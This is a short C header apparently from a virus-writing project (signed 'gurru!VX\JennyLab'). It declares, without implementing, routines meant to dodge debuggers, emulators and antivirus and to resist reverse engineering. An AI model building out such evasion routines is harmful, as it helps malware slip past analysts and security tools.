// gurru!VX\\JennyLab
#ifndef H_SECURITY
#define H_SECURITY


/*
	Security function to avoid detections, kill, reversing etc...
*/


	int lSecurity();
	//void inline __security_isdebugger();
	//void inline __security_breakdebugger();
	//void inline __security_win10_dbgstring();
	//void inline __security_find_debugger();
	//void inline __security_pebdebugger();
	//void  __security_ntinfothread();
	void __security_isdebuggerpresent();
	//void inline __security_antiav();
	void __security_antiemu();
	void __security_ntinfothread();
	int __security_int();


#endif
